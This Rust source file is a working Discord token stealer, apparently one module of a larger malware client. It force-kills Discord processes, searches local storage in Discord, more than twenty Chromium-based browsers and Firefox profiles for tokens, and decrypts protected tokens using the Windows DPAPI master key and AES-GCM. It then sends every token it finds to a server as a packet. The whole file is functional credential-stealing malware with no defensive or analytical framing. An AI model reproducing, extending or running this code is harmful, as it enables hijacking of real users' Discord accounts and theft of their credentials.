use aes_gcm::{Aes256Gcm, Key, KeyInit, Nonce};
use aes_gcm::aead::Aead;
use base64::{engine::general_purpose, Engine as _};
use common::packets::{DiscordTokenData, DiscordTokenInfo, ServerboundPacket};
use once_cell::sync::Lazy;
use regex::Regex;
use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::ptr;
use std::sync::mpsc;
use std::thread;
use std::time::Duration;
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::DATA_BLOB;
use crate::handler::send_packet_sync;

static DISCORD_TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r"mfa\.[\w-]{84}|[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}").unwrap()
});

static ENCRYPTED_TOKEN_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"dQw4w9WgXcQ:[^"]*"#).unwrap()
});

const DISCORD_SOURCES: &[(&str, &str)] = &[
    ("Discord", "discord/Local Storage/leveldb"),
    ("Discord Canary", "discordcanary/Local Storage/leveldb"),
    ("Lightcord", "lightcord/Local Storage/leveldb"),
    ("Discord PTB", "discordptb/Local Storage/leveldb"),
];

const CHROMIUM_SOURCES: &[(&str, &str)] = &[
    ("Opera", "Opera Software/Opera Stable/Local Storage/leveldb"),
    ("Opera GX", "Opera Software/Opera GX Stable/Local Storage/leveldb"),
    ("Amigo", "Amigo/User Data/Local Storage/leveldb"),
    ("Torch", "Torch/User Data/Local Storage/leveldb"),
    ("Kometa", "Kometa/User Data/Local Storage/leveldb"),
    ("Orbitum", "Orbitum/User Data/Local Storage/leveldb"),
    ("CentBrowser", "CentBrowser/User Data/Local Storage/leveldb"),
    ("7Star", "7Star/7Star/User Data/Local Storage/leveldb"),
    ("Sputnik", "Sputnik/Sputnik/User Data/Local Storage/leveldb"),
    ("Vivaldi", "Vivaldi/User Data/Default/Local Storage/leveldb"),
    ("Chrome SxS", "Google/Chrome SxS/User Data/Local Storage/leveldb"),
    ("Chrome", "Google/Chrome/User Data/Default/Local Storage/leveldb"),
    ("Chrome1", "Google/Chrome/User Data/Profile 1/Local Storage/leveldb"),
    ("Chrome2", "Google/Chrome/User Data/Profile 2/Local Storage/leveldb"),
    ("Chrome3", "Google/Chrome/User Data/Profile 3/Local Storage/leveldb"),
    ("Chrome4", "Google/Chrome/User Data/Profile 4/Local Storage/leveldb"),
    ("Chrome5", "Google/Chrome/User Data/Profile 5/Local Storage/leveldb"),
    ("Epic Privacy Browser", "Epic Privacy Browser/User Data/Local Storage/leveldb"),
    ("Microsoft Edge", "Microsoft/Edge/User Data/Default/Local Storage/leveldb"),
    ("Uran", "uCozMedia/Uran/User Data/Default/Local Storage/leveldb"),
    ("Yandex", "Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb"),
    ("Brave", "BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb"),
    ("Iridium", "Iridium/User Data/Default/Local Storage/leveldb"),
];

const DISCORD_PROCESSES: &[&str] = &[
    "Discord.exe", "DiscordCanary.exe", "DiscordPTB.exe",
    "Lightcord.exe", "discorddevelopment.exe",
];

fn kill_discord_processes() {
    for proc_name in DISCORD_PROCESSES {
        let output = std::process::Command::new("taskkill")
            .args(&["/F", "/IM", proc_name, "/T"])
            .output();
        if let Ok(out) = output {
            if out.status.success() {
                println!("[Discord] Killed {}", proc_name);
            }
        }
    }
    // Give processes a moment to release file locks
    std::thread::sleep(std::time::Duration::from_millis(500));
}

pub fn send_discord_tokens() {
    println!("[Discord] Starting Discord token extraction");
    kill_discord_processes();
    let roaming = std::env::var("APPDATA").unwrap_or_default();
    let localappdata = std::env::var("LOCALAPPDATA").unwrap_or_default();
    println!("[Discord] APPDATA: {}", roaming);
    println!("[Discord] LOCALAPPDATA: {}", localappdata);
    let mut seen = HashSet::new();
    let mut tokens = Vec::new();

    for (name, path_suffix) in DISCORD_SOURCES {
        let path = PathBuf::from(&roaming).join(path_suffix);
        println!("[Discord] Checking {} at {:?}", name, path);
        if path.exists() {
            println!("[Discord] Found {} at {:?}", name, path);
            let master_key = get_master_key_for_discord(&roaming, path_suffix);
            println!("[Discord] Master key for {}: {:?}", name, master_key.as_ref().map(|k| k.len()));
            scan_leveldb(&path, name, master_key.as_deref(), &mut seen, &mut tokens);
        }
    }

    for (name, path_suffix) in CHROMIUM_SOURCES {
        let path = PathBuf::from(&localappdata).join(path_suffix);
        if path.exists() {
            println!("[Discord] Found Chromium source {} at {:?}", name, path);
            scan_leveldb(&path, name, None, &mut seen, &mut tokens);
        }
    }

    let firefox_path = PathBuf::from(&roaming).join("Mozilla/Firefox/Profiles");
    println!("[Discord] Checking Firefox profiles at {:?}", firefox_path);
    if firefox_path.exists() {
        // Use a timeout for Firefox scanning since it can be slow
        let (tx, rx) = mpsc::channel();
        let fp = firefox_path.clone();
        let mut seen_clone = seen.clone();
        let mut tokens_clone = tokens.clone();
        
        thread::spawn(move || {
            scan_firefox_profiles(&fp, &mut seen_clone, &mut tokens_clone);
            let _ = tx.send((seen_clone, tokens_clone));
        });

        match rx.recv_timeout(Duration::from_secs(60)) {
            Ok((_new_seen, new_tokens)) => {
                for t in new_tokens {
                    if seen.insert(t.token.clone()) {
                        tokens.push(t);
                    }
                }
                println!("[Discord] Firefox scan completed, total tokens: {}", tokens.len());
            }
            Err(_) => {
                println!("[Discord] Firefox profile scan timed out (skipping)");
            }
        }
    } else {
        println!("[Discord] Firefox profiles not found at {:?}", firefox_path);
    }

    println!("[Discord] Total tokens found: {}", tokens.len());
    for token in &tokens {
        println!("[Discord] Token from {}: {}...", token.source, &token.token[..20.min(token.token.len())]);
    }

    let payload = DiscordTokenData { tokens };
    match send_packet_sync(ServerboundPacket::DiscordTokenData(payload)) {
        Ok(_) => println!("[Discord] Sent DiscordTokenData packet"),
        Err(e) => println!("[Discord] Failed to send DiscordTokenData: {}", e),
    }
}

fn get_master_key_for_discord(roaming: &str, path_suffix: &str) -> Option<Vec<u8>> {
    let root = PathBuf::from(roaming).join(path_suffix).parent()?.parent()?.to_path_buf();
    let local_state = root.join("Local State");
    get_master_key(&local_state)
}

fn scan_leveldb(
    path: &Path,
    source: &str,
    master_key: Option<&[u8]>,
    seen: &mut HashSet<String>,
    results: &mut Vec<DiscordTokenInfo>,
) {
    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries.flatten() {
            let path = entry.path();
            if !path.is_file() {
                continue;
            }
            if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
                if ext != "log" && ext != "ldb" {
                    continue;
                }
            } else {
                continue;
            }

            if let Ok(data) = fs::read(&path) {
                let contents = String::from_utf8_lossy(&data);

                if let Some(key) = master_key {
                    for capture in ENCRYPTED_TOKEN_RE.captures_iter(&contents) {
                        if let Some(token_match) = capture.get(0) {
                            if let Some(token) = decrypt_discord_token(token_match.as_str(), key) {
                                if seen.insert(token.clone()) {
                                    results.push(DiscordTokenInfo {
                                        source: source.to_string(),
                                        token,
                                    });
                                }
                            }
                        }
                    }
                }

                for capture in DISCORD_TOKEN_RE.captures_iter(&contents) {
                    if let Some(token_match) = capture.get(0) {
                        let token = token_match.as_str().to_string();
                        if seen.insert(token.clone()) {
                            results.push(DiscordTokenInfo {
                                source: source.to_string(),
                                token,
                            });
                        }
                    }
                }
            }
        }
    }
}

fn scan_firefox_profiles(path: &Path, seen: &mut HashSet<String>, results: &mut Vec<DiscordTokenInfo>) {
    if !path.exists() {
        return;
    }

    if let Ok(entries) = fs::read_dir(path) {
        for entry in entries.flatten() {
            let path = entry.path();
            if path.is_dir() {
                scan_firefox_profiles(&path, seen, results);
            } else if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
                if ext == "sqlite" {
                    scan_firefox_file(&path, seen, results);
                }
            }
        }
    }
}

fn scan_firefox_file(path: &Path, seen: &mut HashSet<String>, results: &mut Vec<DiscordTokenInfo>) {
    if let Ok(data) = fs::read(&path) {
        let contents = String::from_utf8_lossy(&data);
        for capture in DISCORD_TOKEN_RE.captures_iter(&contents) {
            if let Some(token_match) = capture.get(0) {
                let token = token_match.as_str().to_string();
                if seen.insert(token.clone()) {
                    results.push(DiscordTokenInfo {
                        source: format!("Firefox ({})", path.display()),
                        token,
                    });
                }
            }
        }
    }
}

fn get_master_key(local_state_path: &Path) -> Option<Vec<u8>> {
    let content = fs::read_to_string(local_state_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&content).ok()?;
    let encrypted_key_b64 = json["os_crypt"]["encrypted_key"]
        .as_str()
        .or_else(|| json["os_crypt"]["os_encrypted_key"].as_str())?;
    let encrypted_key = general_purpose::STANDARD.decode(encrypted_key_b64).ok()?;
    if !encrypted_key.starts_with(b"DPAPI") {
        return None;
    }
    dpapi_decrypt(&encrypted_key[5..])
}

fn dpapi_decrypt(data: &[u8]) -> Option<Vec<u8>> {
    unsafe {
        let mut input = DATA_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut _,
        };
        let mut output = DATA_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        if CryptUnprotectData(
            &mut input,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            &mut output,
        ) != 0
        {
            let result = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            winapi::um::winbase::LocalFree(output.pbData as *mut _);
            Some(result)
        } else {
            None
        }
    }
}

fn decrypt_discord_token(token: &str, master_key: &[u8]) -> Option<String> {
    let encoded = token.split("dQw4w9WgXcQ:").nth(1)?;
    let data = general_purpose::STANDARD.decode(encoded).ok()?;
    decrypt_aes_gcm(&data, master_key).map(|s| s.trim_end_matches(char::from(0)).to_string())
}

fn decrypt_aes_gcm(data: &[u8], key: &[u8]) -> Option<String> {
    if data.len() < 15 {
        return None;
    }

    let nonce = &data[3..15];
    let ciphertext = &data[15..];

    let key = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce);

    cipher.decrypt(nonce, ciphertext).ok().and_then(|bytes| String::from_utf8(bytes).ok())
}
